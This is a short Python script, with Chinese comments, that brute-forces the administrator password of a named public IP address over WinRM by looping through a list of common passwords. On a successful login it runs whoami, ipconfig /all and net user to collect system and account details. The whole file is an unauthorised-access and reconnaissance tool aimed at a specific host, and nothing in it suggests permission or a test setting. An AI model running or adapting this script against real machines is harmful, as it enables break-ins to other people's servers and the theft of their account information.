#!/usr/bin/env python3
"""winrm_12471.py - 用pywinrm打124.71.142.158 WinRM"""
import winrm

HOST = "124.71.142.158"
USER = "administrator"
PASSWORDS = ["Server000", "123456", "admin123", "Server0000", "server000",
             "Admin@123", "Admin123", "12345678", "password", "P@ssw0rd",
             "Server001", "Server@000", "server0000", "qwer1234"]

for pw in PASSWORDS:
    try:
        print("trying %s/%s ..." % (USER, pw), flush=True)
        s = winrm.Session(HOST, auth=(USER, pw), transport="ntlm",
                          server_cert_validation="ignore", read_timeout_sec=15, operation_timeout_sec=10)
        r = s.run_cmd("whoami")
        if r.status_code == 0 or r.std_out:
            print("!!! WINRM HIT: %s/%s -> %s" % (USER, pw, r.std_out.decode(errors="ignore")[:100]), flush=True)
            # 拿系统信息
            r2 = s.run_cmd("ipconfig", ["/all"])
            print("IPCONFIG:", r2.std_out.decode(errors="ignore")[:500], flush=True)
            r3 = s.run_cmd("net", ["user"])
            print("USERS:", r3.std_out.decode(errors="ignore")[:500], flush=True)
            break
    except Exception as e:
        err = str(e)
        # 认证失败 vs 其他错误
        if "401" in err or "Unauthorized" in err or "auth" in err.lower():
            print("  auth failed: %s" % err[:80], flush=True)
        elif "timed out" in err.lower() or "Timeout" in err:
            print("  timeout", flush=True)
        else:
            print("  err: %s" % err[:120], flush=True)
print("=== DONE ===")
